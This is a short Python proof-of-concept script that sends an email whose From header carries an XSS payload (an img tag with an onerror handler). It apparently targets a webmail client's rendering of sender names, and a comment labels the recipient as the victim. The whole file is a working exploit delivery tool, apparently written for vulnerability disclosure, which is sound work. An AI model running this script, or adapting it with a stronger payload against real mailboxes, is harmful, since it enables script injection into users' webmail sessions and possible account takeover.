# -*- coding: utf-8 -*-

import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Change the details here appropriate to your configuration
me = "your_username_here_for_smtp" # SMTP User
me_password = "foobar"  #SMTP Passwd 
you = "testyuser12@yahoo.com"  #Victim's E-mail Address
smtp_server = "mtarelay.ops.yahoo.net" # Your SMTP server address

msg = MIMEMultipart('alternative')
msg['Subject'] = "POC"
msg['From'] = "\"test\"> <img src=\"x\" onerror=\"prompt(domain)\"></img>"
msg['To'] = you

text = "Hello There!"
html = r"""
text here
"""

part1 = MIMEText(text, 'plain')
part2 = MIMEText(html, 'html')

msg.attach(part1)
msg.attach(part2)

s = smtplib.SMTP('mtarelay.ops.yahoo.net')
s.sendmail("manmada@yahoo-inc.com", "manmada@yahoo-inc.com", msg.as_string())
s.quit()
